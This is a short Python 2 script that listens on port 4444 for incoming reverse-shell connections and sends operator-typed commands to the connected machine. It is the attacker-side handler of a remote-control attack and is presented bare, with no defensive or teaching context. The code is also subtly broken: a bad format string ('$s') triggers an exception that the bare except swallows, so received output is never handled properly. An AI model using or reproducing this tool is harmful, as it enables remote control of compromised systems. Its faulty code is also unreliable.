import socket 
import sys

host = "10.0.0.8"
port = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen(5)
print("[*] Server bound to %s:%d" % (host, port))

connected = False
while 1:
	#Accept connections from outside
	if not connected:
		(client, address) = server.accept()
		connected = True
		print("[*] Accept Shell Connection")
		buffer = ""

		while 1: 
			try:
				recv_buffer = client.recv(4096)
				print(" [*] Recived: $s" % (recv_buffer))
				if not len(recv_buffer):
					break
				else:
					buffer += recv_buffer
			except:
				break
	# We've recived everything, now it's time to send some input
	command = raw_input("Enter command")
	client.sendall(command + "\r\n\n")
	print("[*] Send => %s" % (command))